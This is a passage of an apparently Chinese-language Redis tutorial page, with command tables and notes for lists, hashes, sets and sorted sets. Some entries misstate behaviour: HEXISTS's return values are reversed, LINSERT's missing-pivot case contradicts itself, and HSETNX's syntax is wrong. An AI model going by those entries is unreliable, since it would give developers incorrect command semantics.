<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> LCS key1 key2 IDX MINMATCHLEN <span class="token number">4</span> WITHMATCHLEN
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"matches"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">4</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">7</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">5</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">8</span>
      <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">4</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"len"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>如果没有修饰符，则返回表示<strong>最长</strong>公共子字符串的字符串。</p>
</li>
<li>
<p>当<code>LEN</code>给出命令返回最长公共子字符串的长度。</p>
</li>
<li>
<p>当<code>IDX</code>给出该命令时，返回一个数组。</p>
<p>len：包含 LCS匹配结果长度</p>
<p>matches：两个字符串匹配上的开始和结束偏移量。当<code>WITHMATCHLEN</code>给出每个表示匹配的数组时，也将具有匹配的长度</p>
</li>
</ul>
</li>
</ol>
<h1>List</h1>
<p>Redis 列表是字符串值的链表。</p>
<p>Redis 列表经常用于：</p>
<ul>
<li>实现堆栈和队列。</li>
<li>为后台工作系统构建队列管理。</li>
</ul>
<p>双向链表：LPUSH命令将一个新元素添加到列表的左侧（头部），而该RPUSH命令将一个新元素添加到列表的右侧（尾部）</p>
<p>使用列表的技巧</p>
<ul>
<li>lpush+lpop = Stack(栈)</li>
<li>lpush+rpop = Queue（队列）</li>
<li>lpush+ltrim = Capped Collection（有限集合）</li>
<li>lpush+brpop = Message Queue（消息队列）</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th style="text-align:left">功能</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">LPUSH</td>
<td style="text-align:left">LPUSH <em>key</em> value [value …]</td>
<td style="text-align:left">增</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">LPOP</td>
<td style="text-align:left">LPOP key</td>
<td style="text-align:left">删</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">LPUSHX</td>
<td style="text-align:left">LPUSHX <em>key</em> value [value …]</td>
<td style="text-align:left">增</td>
<td>当 key 不存在时不会进行任何操作</td>
</tr>
<tr>
<td style="text-align:left">LSET</td>
<td style="text-align:left">LSET <em>key</em> index value</td>
<td style="text-align:left">改</td>
<td>修改指定位置元素</td>
</tr>
<tr>
<td style="text-align:left">LINSERT</td>
<td style="text-align:left">LINSERT key &lt;BEFORE |AFTER&gt; pivot element</td>
<td style="text-align:left">查&amp;增</td>
<td>功能： 在参考值pivot 之前或之后，将元素插入存储在 key 处的列表中。<br>-  当key不存在时，认为是空列表，不进行任何操作。 <br>- 当key存在，但不包含值pivot 时返回错误。<br><br>返回：  插入操作后列表的长度，或者当未找到值主元时为 -1。<br>举例：<code>LINSERT mylist BEFORE "World" "There"</code></td>
</tr>
<tr>
<td style="text-align:left">LREM</td>
<td style="text-align:left">LREM <em>key</em> count value</td>
<td style="text-align:left">删</td>
<td>删除count个value。count 为负数，从列尾开始计算</td>
</tr>
<tr>
<td style="text-align:left">LTRIM</td>
<td style="text-align:left">LTRIM <em>key</em> start stop</td>
<td style="text-align:left">删</td>
<td>截断列表元素，-1 是列表的最后一个元素</td>
</tr>
<tr>
<td style="text-align:left">LRANGE</td>
<td style="text-align:left">LRANGE <em>key</em> start stop</td>
<td style="text-align:left">查</td>
<td>获取列表指定范围数据：偏移量为负数，表示从列表末尾开始的偏移量。 <br>正整数（正数排名），负整数（倒数排名）<br>例如，-1 是列表的最后一个元素，-2 是倒数第二个元素，依此类推。</td>
</tr>
<tr>
<td style="text-align:left">LLEN</td>
<td style="text-align:left">LLEN <em>key</em></td>
<td style="text-align:left">查</td>
<td>获取列表元素个数</td>
</tr>
<tr>
<td style="text-align:left">LINDEX</td>
<td style="text-align:left">LINDEX <em>key</em> index</td>
<td style="text-align:left">查</td>
<td>获取列表第index个元素，-1 是列表的最后一个元素</td>
</tr>
<tr>
<td style="text-align:left">LPOS</td>
<td style="text-align:left">LPOS <em>key</em> element [RANK rank] [COUNT num-matches] [MAXLEN len]</td>
<td style="text-align:left">查</td>
<td>查找列表元素（发布版本：6.0.6） <br>[RANK rank] ： 指定要返回的第一个元素的“排名”，正整数（正数排名），负整数（倒数排名）。<br>[COUNT num-matches]：总共返回 num-matches个目标元素<br>[MAXLEN len]：最大筛查次数</td>
</tr>
<tr>
<td style="text-align:left">BLPOP</td>
<td style="text-align:left">BLPOP <em>key [key …]</em> timeout</td>
<td style="text-align:left">删</td>
<td>它是 LPOP 的阻塞版本。<br> 当没有任何元素可以从任何给定列表中弹出时，它会阻塞连接，直到超时后返回 null</td>
</tr>
<tr>
<td style="text-align:left">RPUSH</td>
<td style="text-align:left">RPUSH <em>key</em> value [value …]</td>
<td style="text-align:left">增</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">RPUSHX</td>
<td style="text-align:left">RPUSHX <em>key</em> value [value …]</td>
<td style="text-align:left">增</td>
<td>当 key 不存在时不会进行任何操作</td>
</tr>
<tr>
<td style="text-align:left">RPOP</td>
<td style="text-align:left">RPOP <em>key</em></td>
<td style="text-align:left">删</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">RPOPLPUSH</td>
<td style="text-align:left">RPOPLPUSH <em>source</em> <em>destination</em></td>
<td style="text-align:left">删</td>
<td>删除列表中的最后一个元素，将其添加到另一个列表并返回</td>
</tr>
<tr>
<td style="text-align:left">BRPOP</td>
<td style="text-align:left">BRPOP <em>key [key …]</em> timeout</td>
<td style="text-align:left">删</td>
<td>它是 RPOP 的阻塞版本</td>
</tr>
</tbody>
</table>
<blockquote>
<p>其他（6.0.6以下版本不支持）</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>使用</th>
<th>发行版本</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>LMOVE</td>
<td><strong>LMOVE</strong> <em>source  destination</em> <strong>LEFT |RIGHT   LEFT|RIGHT</strong></td>
<td>6.2.0</td>
<td>从列表中弹出一个元素，将其推送到另一个列表并返</td>
</tr>
<tr>
<td>LMPOP</td>
<td><strong>LMPOP</strong> numkeys <em>key [key …]</em> &lt;<strong>LEFT |RIGHT</strong>&gt; [<strong>COUNT</strong> count]</td>
<td>7.0.0</td>
<td>从提供的键名列表中的第一个非空列表键中弹出一个或多个元素。</td>
</tr>
<tr>
<td>BLMPOP</td>
<td><strong>BLMPOP</strong> timeout numkeys <em>key [key …]</em> &lt;<strong>LEFT |RIGHT</strong>&gt; [<strong>COUNT</strong> count]</td>
<td>7.0.0</td>
<td>它是 LMPOP 的阻塞版本</td>
</tr>
<tr>
<td>BLMOVE</td>
<td><strong>BLMOVE</strong>  <em>source  destination</em> &lt;<strong>LEFT |RIGHT</strong>&gt; &lt;<strong>LEFT |RIGHT</strong>&gt; timeout</td>
<td>6.2.0</td>
<td>它是 LMOVE 的阻塞版本</td>
</tr>
</tbody>
</table>
<h1>Hash</h1>
<p>Redis 哈希是结构为字段值对集合的记录类型。您可以使用散列来表示基本对象并存储计数器分组等。</p>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th style="text-align:left">功能</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">HEXISTS</td>
<td style="text-align:left">HEXISTS <em>key</em> field</td>
<td style="text-align:left">查</td>
<td>查询 key.field 是否存在，存在返回0，不存在返回1</td>
</tr>
<tr>
<td style="text-align:left">HGET</td>
<td style="text-align:left">HGET <em>key</em> field</td>
<td style="text-align:left">查</td>
<td>获取指定键值对</td>
</tr>
<tr>
<td style="text-align:left">HMGET</td>
<td style="text-align:left">HMGET <em>key</em> field [field …]</td>
<td style="text-align:left">查</td>
<td>获取多个字段值</td>
</tr>
<tr>
<td style="text-align:left">HGETALL</td>
<td style="text-align:left">HGETALL <em>key</em></td>
<td style="text-align:left">查</td>
<td>获取所有键值对数据</td>
</tr>
<tr>
<td style="text-align:left">HINCRBY</td>
<td style="text-align:left">HINCRBY <em>key</em> field increment</td>
<td style="text-align:left">改</td>
<td>将hash 的 field字段的整数值增加给定的数字</td>
</tr>
<tr>
<td style="text-align:left">HINCRBYFLOAT</td>
<td style="text-align:left">HINCRBYFLOAT <em>key</em> field increment</td>
<td style="text-align:left">改</td>
<td>将hash 的 field字段的浮点值增加给定的数量</td>
</tr>
<tr>
<td style="text-align:left">HKEYS</td>
<td style="text-align:left">HKEYS <em>key</em></td>
<td style="text-align:left">查</td>
<td>获取hash 中的所有key</td>
</tr>
<tr>
<td style="text-align:left">HLEN</td>
<td style="text-align:left">HLEN <em>key</em></td>
<td style="text-align:left">查</td>
<td>键值对个数</td>
</tr>
<tr>
<td style="text-align:left">HSET</td>
<td style="text-align:left">HSET <em>key</em> field value</td>
<td style="text-align:left">增</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">HMSET</td>
<td style="text-align:left">HMSET <em>key</em> field value [field value…]</td>
<td style="text-align:left">增</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">HSETNX</td>
<td style="text-align:left">HSETNX <em>key</em> field value [field value…]</td>
<td style="text-align:left">增</td>
<td>如果 key field 都已存在时不会进行任何操作</td>
</tr>
<tr>
<td style="text-align:left">HSTRLEN</td>
<td style="text-align:left">HSTRLEN <em>key</em> field</td>
<td style="text-align:left">查</td>
<td>获取 key.field的value的长度</td>
</tr>
<tr>
<td style="text-align:left">HVALS</td>
<td style="text-align:left">HVALS <em>key</em></td>
<td style="text-align:left">查</td>
<td>获取hash 中的所有value</td>
</tr>
<tr>
<td style="text-align:left">HSCAN</td>
<td style="text-align:left">HSCAN <em>key</em> cursor [MATCH pattern] [COUNT count]</td>
<td style="text-align:left">查</td>
<td>使用方法方法可以参考<a href="#Order_SCAN">SCAN</a></td>
</tr>
<tr>
<td style="text-align:left">HDEL</td>
<td style="text-align:left">HDEL <em>key</em> field [field …]</td>
<td style="text-align:left">删</td>
<td>删除一个或者多个Hash表的键值对</td>
</tr>
</tbody>
</table>
<blockquote>
<p>其他（6.0.6以下版本不支持）</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>发行版本</th>
<th>使用</th>
<th>功能</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>HRANDFIELD</td>
<td>6.2.0</td>
<td><strong>HRANDFIELD</strong> key [count [<strong>WITHVALUES</strong>]]</td>
<td>查</td>
<td>从哈希中获取一个或多个随机字段<br>[<strong>WITHVALUES</strong>]：返回结果包含value</td>
</tr>
</tbody>
</table>
<p>实战场景</p>
<ul>
<li>缓存：相比String更节省空间，能直观的维护缓存信息，如用户信息，视频信息等。</li>
</ul>
<h1>Set：无序集合</h1>
<p>Redis 集是唯一字符串（成员）的无序集合。您可以使用 Redis 集高效地：</p>
<ul>
<li>跟踪唯一项目（例如，跟踪访问给定博客文章的所有唯一 IP 地址）</li>
<li>表示关系（例如，具有给定角色的所有用户的集合）</li>
<li>执行常见的集合运算，例如交集、并集和差集</li>
</ul>
<p><strong>实战场景</strong></p>
<ul>
<li><strong>标签</strong>（tag）,给用户添加标签，或者用户给消息添加标签，这样有同一标签或者类似标签的可以给推荐关注的事或者关注的人。</li>
<li><strong>点赞，或点踩，收藏等</strong>，可以放到set中实现</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th style="text-align:left">功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SADD</td>
<td style="text-align:left">SADD <em>key</em> member [member …]</td>
<td style="text-align:left">增</td>
<td style="text-align:left">向集合中添加一个或多个成员</td>
</tr>
<tr>
<td style="text-align:left">SCARD</td>
<td style="text-align:left">SCARD <em>key</em></td>
<td style="text-align:left">查</td>
<td style="text-align:left">集合中元素个数</td>
</tr>
<tr>
<td style="text-align:left">SDIFF</td>
<td style="text-align:left">SDIFF <em>key [key …]</em></td>
<td style="text-align:left">集合：补</td>
<td style="text-align:left">取多个集合的差分（其他集合中都没有的元素）</td>
</tr>
<tr>
<td style="text-align:left">SDIFFSTORE</td>
<td style="text-align:left">SDIFFSTORE <em>destination</em> <em>key [key …]</em></td>
<td style="text-align:left">集合：补&amp;存</td>
<td style="text-align:left">取多个集合的差分, 并将结果集存储在一个集合中</td>
</tr>
<tr>
<td style="text-align:left">SINTER</td>
<td style="text-align:left">SINTER <em>key [key …]</em></td>
<td style="text-align:left">集合：交</td>
<td style="text-align:left">取多个集合的交集并返回 <br>INTER 为 Intersect /ˌɪntəˈsekt/ 的缩写</td>
</tr>
<tr>
<td style="text-align:left">SINTERSTORE</td>
<td style="text-align:left">SINTERSTORE <em>destination</em> <em>key [key …]</em></td>
<td style="text-align:left">集合：交&amp;存</td>
<td style="text-align:left">取多个集合的交集并将结果集存储在一个集合中（destination）</td>
</tr>
<tr>
<td style="text-align:left">SISMEMBER</td>
<td style="text-align:left">SISMEMBER <em>key</em> member</td>
<td style="text-align:left">查</td>
<td style="text-align:left">检查一个元素是否存在</td>
</tr>
<tr>
<td style="text-align:left">SMEMBERS</td>
<td style="text-align:left">SMEMBERS <em>key</em></td>
<td style="text-align:left">查</td>
<td style="text-align:left">返回所有元素</td>
</tr>
<tr>
<td style="text-align:left">SMOVE</td>
<td style="text-align:left">SMOVE <em>source destination</em> member</td>
<td style="text-align:left">查&amp;移动</td>
<td style="text-align:left">将集合source 中的元素member移动到集合destination中</td>
</tr>
<tr>
<td style="text-align:left">SPOP</td>
<td style="text-align:left">SPOP key [count]</td>
<td style="text-align:left">查&amp;删</td>
<td style="text-align:left">从集合中移除并返回一个或多个（count）随机成员</td>
</tr>
<tr>
<td style="text-align:left">SRANDMEMBER</td>
<td style="text-align:left">SRANDMEMBER key [count]</td>
<td style="text-align:left">查</td>
<td style="text-align:left">从集合中获取一个或多个（count）随机成员，元素在集合中依然存在</td>
</tr>
<tr>
<td style="text-align:left">SREM</td>
<td style="text-align:left">SREM <em>key</em> member [member …]</td>
<td style="text-align:left">删</td>
<td style="text-align:left">从SET中删除一个或者多个元素</td>
</tr>
<tr>
<td style="text-align:left">SUNION</td>
<td style="text-align:left">SUNION <em>key [key …]</em></td>
<td style="text-align:left">集合：并</td>
<td style="text-align:left">取多个集合的并集</td>
</tr>
<tr>
<td style="text-align:left">SUNIONSTORE</td>
<td style="text-align:left">SUNIONSTORE <em>destination</em> <em>key [key …]</em></td>
<td style="text-align:left">集合：并&amp;存</td>
<td style="text-align:left">取多个集合的并集并将结果集存储在一个集合中（destination）</td>
</tr>
<tr>
<td style="text-align:left">SSCAN</td>
<td style="text-align:left">SSCAN <em>key</em> cursor [MATCH pattern] [COUNT count]</td>
<td style="text-align:left">遍历查</td>
<td style="text-align:left">参考<a href="#Order_SCAN">SCAN</a></td>
</tr>
</tbody>
</table>
<blockquote>
<p>其他（6.0.6以下版本不支持）</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th style="text-align:left">发行版本</th>
<th style="text-align:left">功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SINTERCARD</td>
<td style="text-align:left">SINTERCARD numkeys <em>key [key …]</em> [LIMIT limit]</td>
<td style="text-align:left">7.0.0</td>
<td style="text-align:left">集合：交</td>
<td style="text-align:left">获取两个集合的交集数量<br>[LIMIT  limit]：最大交集量 <br><code>SINTERCARD 2 testset testset1返回19</code> 两个集合的交集量容量为19 <br><code>SINTERCARD 2 testset testset1 limit 10 </code>返回10</td>
</tr>
<tr>
<td style="text-align:left">SMISMEMBER</td>
<td style="text-align:left">SMISMEMBER <em>key</em> member [member …]</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">查</td>
<td style="text-align:left">返回每个成员是否是存储在 key  集合的成员（多个元素的存在的查询） <br>返回与指定的member顺序一致的数组</td>
</tr>
</tbody>
</table>
<h1>Zset : 有序集合</h1>
<p>Redis 排序集是由<strong>相关分数</strong>排序的唯一字符串（成员）的集合。当多个字符串具有相同的分数时，这些字符串按字典顺序排列。排序集的一些用例包括：</p>
<ul>
<li>
<p>排行榜。例如，您可以使用排序集轻松维护大型在线游戏中最高分的有序列表。</p>
</li>
<li>
<p>速率限制器。特别是，您可以使用排序集来构建滑动窗口速率限制器，以防止过多的 API 请求。</p>
</li>
</ul>
<p>Sorted Set 中的每个元素都与一个浮点值相关联，称为<code>score </code>。所以Sorted Set 也是一种Hash结构。</p>
<p>排序规则：</p>
<ul>
<li>
<p>如果 A 和 B 是具有不同分数的两个元素， A.score &gt; B.score，则 A &gt; B 。</p>
</li>
<li>
<p>如果 A 和 B 具有完全相同的分数，如果 A 字符串<code>在字典顺序上</code>大于 B 字符串，则 A &gt; B。A 和 B 字符串不能相等，因为排序集只有唯一元素</p>
</li>
</ul>
<p>实战场景</p>
<ul>
<li><strong>排行榜</strong>：小说视频等网站需要对用户上传的小说视频做排行榜，榜单可以按照用户关注数，更新时间，字数等打分，做排行。</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th style="text-align:left">功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">ZADD</td>
<td style="text-align:left">ZADD <em>key</em> [NX | XX] [GT | LT] [CH] [INCR]  <em>score member [score member   …]</em></td>
<td style="text-align:left">增</td>
<td style="text-align:left">为有序集合添加一个/多个元素，若元素存在，则修改元素的score<br> - <strong>XX</strong>:  只更新已经存在的元素。不添加新元素。<br>- <strong>NX</strong>:   只添加新元素。 不要更新已经存在的元素. <br>- <strong>LT</strong>:   如果新分数<strong>小于</strong>当前分数，则仅更新现有元素。 此标志不会阻止添加新元素。<br>- <strong>GT</strong>:  如果新分数<strong>大于</strong>当前分数，则仅更新现有元素。 此标志不会阻止添加新元素。<br>- <strong>CH</strong>:  通常ZADD的返回值只计算添加的新元素的数量，此命令将返回值则为更改的元素总数（CH 是 <em>changed</em> 的缩写），即：<strong>添加的新元素</strong>和<strong>已经存在且分数被更新的元素</strong>。  <br><strong>INCR</strong>:   此命令类似于<code>ZINCRBY</code>。在此模式下只能指定一个分数元素对。<br><br>注意: <strong>GT</strong>、<strong>LT</strong> 和 <strong>NX</strong> 选项是互斥的。</td>
</tr>
<tr>
<td style="text-align:left">ZCARD</td>
<td style="text-align:left">ZCARD <em>key</em></td>
<td style="text-align:left">查</td>
<td style="text-align:left">返回存储在 key 处的有序集合元素数 <br>card: cardinality 基数</td>
</tr>
<tr>
<td style="text-align:left">ZCOUNT</td>
<td style="text-align:left">ZCOUNT <em>key</em> min max</td>
<td style="text-align:left">查</td>
<td style="text-align:left">用给定值内的分数计算有序集合元素数（包含min 和 max）</td>
</tr>
<tr>
<td style="text-align:left">ZINCRBY</td>
<td style="text-align:left">ZINCRBY <em>key</em> increment member</td>
<td style="text-align:left">查&amp;改</td>
<td style="text-align:left">将存储在 key 的有序集合中的成员的分数按增量递增 <br>① 如果成员在排序集中不存在，则将其添加为增量作为其分数（就像它之前的分数是 0.0） <br>② 如果 key 不存在，则创建一个以指定成员为唯一成员的新排序集。</td>
</tr>
<tr>
<td style="text-align:left">ZLEXCOUNT</td>
<td style="text-align:left">ZLEXCOUNT <em>key</em> min max</td>
<td style="text-align:left">查</td>
<td style="text-align:left">该命令返回有序集合中指定字典范围内的元素个数。<br>① 当一个有序集合中的所有元素以相同的分数插入时，强制使用字典顺序<br>② min 和 max 的定义类似 <a href="#ORDER_ZRANGEBYLEX">ZRANGEBYLEX</a></td>
</tr>
<tr>
<td style="text-align:left">ZPOPMAX</td>
<td style="text-align:left">ZPOPMAX <em>key</em> [count]</td>
<td style="text-align:left">查&amp;删</td>
<td style="text-align:left"><code>从一个key，弹出多个成员</code><br>删除并返回存储在排序集（key）中得分最高的 count个成员。</td>
</tr>
<tr>
<td style="text-align:left">BZPOPMAX</td>
<td style="text-align:left">BZPOPMAX <em>key [key …]</em> timeout</td>
<td style="text-align:left">查&amp;删</td>
<td style="text-align:left"><code> 从多个key，弹出一个成员</code><br>从一个或多个排序集（key [key …]）删除并返回得分最高的成员<br>无数据，则阻塞等待，直到有一个key可用。</td>
</tr>
<tr>
<td style="text-align:left">ZPOPMIN</td>
<td style="text-align:left">ZPOPMIN <em>key</em> [count]</td>
<td style="text-align:left">查&amp;删</td>
<td style="text-align:left"><code>从一个key，弹出多个成员</code><br>删除并返回存储在 key 的排序集中得分最低的 count个 成员</td>
</tr>
<tr>
<td style="text-align:left">BZPOPMIN</td>
<td style="text-align:left">BZPOPMIN <em>key [key …]</em> timeout</td>
<td style="text-align:left">查&amp;删</td>
<td style="text-align:left"><code>从多个key，弹出一个成员</code><br>从一个或多个排序集中删除并返回得分最低的成员，或阻止，直到有一个可用</td>
</tr>
<tr>
<td style="text-align:left">ZRANGE</td>
<td style="text-align:left">ZRANGE <em>key</em> start stop [WITHSCORES]</td>
<td style="text-align:left">查</td>
<td style="text-align:left">有序集合，返回指定index范围的元素 <br>[WITHSCORES]：一并返回元素分值 <br>举例： <code>ZRANGE hackers 0 -1 WITHSCORES</code></td>
</tr>
<tr>
<td style="text-align:left">ZRANK</td>
<td style="text-align:left">ZRANK <em>key</em> member</td>
<td style="text-align:left">查</td>
<td style="text-align:left">返回 member 在存储在 key 的有序集合中的排名，分数从低到高排序。<br>排名（或索引）从 0 开始</td>
</tr>
<tr>
<td style="text-align:left">ZREVRANK</td>
<td style="text-align:left">ZREVRANK <em>key</em> member</td>
<td style="text-align:left">查</td>
<td style="text-align:left">返回 member 在存储在 key 的有序集合中的排名，分数从高到低排序。<br>排名（或索引）从 0 开始，这意味着得分最高的成员的排名为 0</td>
</tr>
<tr>
<td style="text-align:left">ZREM</td>
<td style="text-align:left">ZREM <em>key</em> member [member …]</td>
<td style="text-align:left">删</td>
<td style="text-align:left">从存储在 key 的排序集中删除指定的成员<br>不存在的成员将被忽略</td>
</tr>
<tr>
<td style="text-align:left">ZREMRANGEBYLEX</td>
<td style="text-align:left">ZREMRANGEBYLEX <em>key</em> min max</td>
<td style="text-align:left">删</td>
<td style="text-align:left">删除给定字典序范围内的元素（闭区间）</td>
</tr>
<tr>
<td style="text-align:left">ZREMRANGEBYRANK</td>
<td style="text-align:left">ZREMRANGEBYRANK <em>key</em> start stop</td>
<td style="text-align:left">删</td>
<td style="text-align:left">删除指定位置区间内的元素（闭区间）</td>
</tr>
<tr>
<td style="text-align:left">ZREMRANGEBYSCORE</td>
<td style="text-align:left">ZREMRANGEBYSCORE <em>key</em> min max</td>
<td style="text-align:left">删</td>
<td style="text-align:left">删除分数介于 min 和 max 之间的元素 （闭区间）</td>
</tr>
<tr>
<td style="text-align:left">ZSCORE</td>
<td style="text-align:left">ZSCORE <em>key</em> member</td>
<td style="text-align:left">查</td>
<td style="text-align:left">获取与排序集合中给定成员关联的分数</td>
</tr>
<tr>
<td style="text-align:left">ZSCAN</td>
<td style="text-align:left">ZSCAN <em>key</em> cursor [MATCH pattern] [COUNT count]</td>
<td style="text-align:left">查</td>
<td style="text-align:left">增量迭代排序集元素和相关分数。使用方法可以参考<a href="#Order_SCAN">SCAN</a></td>
</tr>
</tbody>
</table>
<blockquote>
<p>集合操作（6.0.6 之前）</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th>功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>ZINTERSTORE</strong> <em>destination</em> numkeys <em>key [key …]</em> [<strong>WEIGHTS</strong> weight   [weight …]] [<strong>AGGREGATE</strong> &lt;<strong>SUM</strong> |<strong>MIN</strong> |<strong>MAX</strong>&gt;]</td>
<td>交集</td>
<td style="text-align:left">计算多个有序集合的交集，并保存到destination 中。<br>[<strong>WEIGHTS</strong> weight   [weight …]] ：使用此选项，可以为每个输入排序集指定一个乘法因子。<br>① 每个输入排序集中的每个元素的分数在传递给聚合函数之前都会乘以该因子。<br>② 当未给出 WEIGHTS 时，乘法因子默认为 1。<br>[<strong>AGGREGATE</strong> &lt;<strong>SUM</strong> |<strong>MIN</strong> |<strong>MAX</strong>&gt;] : <em>destination</em> 中元素的分数的计算方式。默认为求和。</td>
</tr>
<tr>
<td style="text-align:left"><strong>ZUNIONSTORE</strong> <em>destination</em> numkeys <em>key [key …]</em> [<strong>WEIGHTS</strong> weight   [weight …]] [<strong>AGGREGATE</strong> &lt;<strong>SUM</strong> |<strong>MIN</strong> |<strong>MAX</strong>&gt;]</td>
<td>并集</td>
<td style="text-align:left">计算多个有序集合的并集，并保存到destination 中。<br>如果destination已经存在，它会被覆盖。<br><br>[<strong>WEIGHTS</strong> weight   [weight …]] ：使用此选项，可以为每个输入排序集指定一个乘法因子<br>① 每个输入排序集中的每个元素的分数在传递给聚合函数之前都会乘以该因子。<br>② 当未给出 WEIGHTS 时，乘法因子默认为 1。<br>[<strong>AGGREGATE</strong> &lt;<strong>SUM</strong> |<strong>MIN</strong> |<strong>MAX</strong>&gt;] : <em>destination</em> 中元素的分数的计算方式。默认为求和。</td>
</tr>
</tbody>
</table>
<blockquote>
<p>集合操作（6.0.6 之后）</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">功能</th>
<th style="text-align:left">版本</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>ZINTER</strong> numkeys <em>key [key …]</em> [<strong>WEIGHTS</strong> weight [weight …]]   [<strong>AGGREGATE</strong> &lt;<strong>SUM</strong> |<strong>MIN</strong> |<strong>MAX</strong>&gt;] [<strong>WITHSCORES</strong>]</td>
<td style="text-align:left">交集</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">计算多个有序集合的交集，并返回</td>
</tr>
<tr>
<td style="text-align:left"><strong>ZUNION</strong> numkeys <em>key [key …]</em> [<strong>WEIGHTS</strong> weight [weight …]]   [<strong>AGGREGATE</strong> &lt;<strong>SUM</strong> |<strong>MIN</strong> |<strong>MAX</strong>&gt;] [<strong>WITHSCORES</strong>]</td>
<td style="text-align:left">并集</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">计算多个有序集合的并集，并返回</td>
</tr>
<tr>
<td style="text-align:left"><strong>ZDIFF</strong> numkeys <em>key [key …]</em> [<strong>WITHSCORES</strong>]</td>
<td style="text-align:left">补集</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">计算第一个集合比后面所有集合多出的元素，并返回<br>（比较逻辑和分值无关）</td>
</tr>
<tr>
<td style="text-align:left"><strong>ZDIFFSTORE</strong> <em>destination</em> numkeys <em>key [key …]</em></td>
<td style="text-align:left">补集</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">计算第一个集合比后面所有集合多出的元素，并存入destination<br>（比较逻辑和分值无关）</td>
</tr>
</tbody>
</table>
<blockquote>
<p>其他（6.0.6以下版本不支持）</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th style="text-align:left">发行版本</th>
<th style="text-align:left">功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">ZRANDMEMBER</td>
<td style="text-align:left"><strong>ZRANDMEMBER</strong> key [count [<strong>WITHSCORES</strong>]]</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">查</td>
<td style="text-align:left">从有序集合中返回一个或多个元素<br>如果提供的 count 参数为正，则返回不同元素的数组。数组的长度是计数或排序集的基数 (ZCARD)，以较低者为准。<br>如果以负数调用，则行为会发生变化，并且允许该命令多次返回相同的元素。在这种情况下，返回元素的数量是指定计数的绝对值。</td>
</tr>
<tr>
<td style="text-align:left">ZRANGE</td>
<td style="text-align:left"><strong>ZRANGE</strong> <em>key</em> start  stop [<strong>BYSCORE</strong> |<strong>BYLEX</strong>] [<strong>REV</strong>] [<strong>LIMIT</strong> offset count]   [<strong>WITHSCORES</strong>]</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">查</td>
<td style="text-align:left">此命令可以替换以下命令：<br><strong>ZREVRANGE、ZRANGEBYSCORE、ZREVRANGEBYSCORE、ZRANGEBYLEX 和 ZREVRANGEBYLEX</strong><br><br> [<strong>BYSCORE</strong> |<strong>BYLEX</strong>] ：根据分值查找/ 根据字典顺序<br><br><code>zrange hackers  + - bylex rev</code><br></td>
</tr>
<tr>
<td style="text-align:left">ZRANGESTORE</td>
<td style="text-align:left"><strong>ZRANGESTORE</strong> <em>dst  src</em> min max   [<strong>BYSCORE</strong> | <strong>BYLEX</strong>]   [<strong>REV</strong>]   [<strong>LIMIT</strong> offset   count]</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">查&amp;存</td>
